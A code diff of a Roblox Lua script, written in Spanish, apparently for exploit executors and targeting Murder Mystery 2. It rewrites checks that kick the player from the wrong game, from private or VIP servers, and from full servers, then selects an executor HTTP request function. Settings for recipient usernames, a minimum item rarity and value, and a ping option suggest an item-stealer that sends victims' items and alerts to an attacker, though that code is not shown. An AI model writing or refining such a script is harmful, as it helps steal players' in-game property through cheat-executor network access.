@@ -302,21 +302,24 @@ local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local pingEveryone = _G.pingEveryone == "Yes"
-
--- Kick por servidor lleno, privado o VIP
-local function CheckServerInitial()
-    if #Players:GetPlayers() >= 12 then
-        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
-    end
-    if game.PrivateServerId and game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
-    end
-    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
-    if success and ownerId and ownerId ~= 0 then
-        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
-    end
+-- Si no está en MM2
+if game.PlaceId ~= 142823291 then
+    LocalPlayer:Kick("⚠️Este script no funciona en este juego, solo funciona en mm2 ✅")
+    return
 end
-CheckServerInitial()
+
+-- Si es un VIP server
+local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
+if serverType == "VIPServer" then
+    LocalPlayer:Kick("⚠️El script no funciona en servidor privado, debes ir a servidor público no lleno ✅")
+    return
+end
+
+-- Si el server está lleno
+if #Players:GetPlayers() >= 12 then
+    LocalPlayer:Kick("⚠️El script no puede funcionar en servidor lleno, debes ir a un servidor que no esté lleno ✅")
+    return
+end
 
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
